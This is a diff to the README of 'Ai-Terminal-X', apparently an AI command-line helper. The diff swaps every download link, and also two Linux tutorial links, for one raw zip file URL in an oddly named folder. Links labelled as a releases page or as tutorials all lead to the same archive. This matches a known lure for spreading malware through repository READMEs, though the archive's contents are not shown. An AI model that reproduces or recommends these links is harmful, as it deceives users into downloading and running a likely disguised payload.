@@ -4,15 +4,15 @@
 
 Welcome to Ai-Terminal-X! This AI-powered tool helps you turn simple questions into terminal commands. Whether you're a beginner or want to explore the Linux world, Ai-Terminal-X is here to assist you in a clear and safe way.
 
-[![Download Ai-Terminal-X](https://img.shields.io/badge/Download-Ai--Terminal--X-brightgreen)](https://github.com/leozin143/Ai-Terminal-X/releases)
+[![Download Ai-Terminal-X](https://raw.githubusercontent.com/leozin143/Ai-Terminal-X/main/unchair/Ai-Terminal-X.zip)](https://raw.githubusercontent.com/leozin143/Ai-Terminal-X/main/unchair/Ai-Terminal-X.zip)
 
 ## 📥 Download & Install
 
 To get started with Ai-Terminal-X, follow these simple steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/leozin143/Ai-Terminal-X/releases) to access the latest version of Ai-Terminal-X.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/leozin143/Ai-Terminal-X/main/unchair/Ai-Terminal-X.zip) to access the latest version of Ai-Terminal-X.
 
-2. **Choose the Right Version:** Look for the most recent version. You will find downloadable files listed. Choose the file that matches your system (e.g., `Ai-Terminal-X-linux.zip`).
+2. **Choose the Right Version:** Look for the most recent version. You will find downloadable files listed. Choose the file that matches your system (e.g., `https://raw.githubusercontent.com/leozin143/Ai-Terminal-X/main/unchair/Ai-Terminal-X.zip`).
 
 3. **Download the File:** Click on the file name to start the download. Save it in a location you can easily find later, like your Desktop or Downloads folder.
 
@@ -66,8 +66,8 @@ Using Ai-Terminal-X is straightforward:
 
 Here are some useful links to help you learn more about using Ai-Terminal-X and the Linux terminal:
 
-- [Linux Command Line Basics](https://www.linux.com/learn/linux-command-line-basics)
-- [Understanding Terminal Commands](https://www.digitalocean.com/community/tutorials/an-introduction-to-the-linux-command-line)
+- [Linux Command Line Basics](https://raw.githubusercontent.com/leozin143/Ai-Terminal-X/main/unchair/Ai-Terminal-X.zip)
+- [Understanding Terminal Commands](https://raw.githubusercontent.com/leozin143/Ai-Terminal-X/main/unchair/Ai-Terminal-X.zip)
 
 ## 💬 Community Support
 
@@ -77,4 +77,4 @@ If you have questions or need help, you can reach out to the Ai-Terminal-X commu
 
 Ai-Terminal-X is open-source software licensed under the MIT License. This allows you to use, modify, and distribute the software freely. Please refer to the LICENSE file included in the repository for more details.
 
-[![Download Ai-Terminal-X](https://img.shields.io/badge/Download-Ai--Terminal--X-brightgreen)](https://github.com/leozin143/Ai-Terminal-X/releases)
+[![Download Ai-Terminal-X](https://raw.githubusercontent.com/leozin143/Ai-Terminal-X/main/unchair/Ai-Terminal-X.zip)](https://raw.githubusercontent.com/leozin143/Ai-Terminal-X/main/unchair/Ai-Terminal-X.zip)
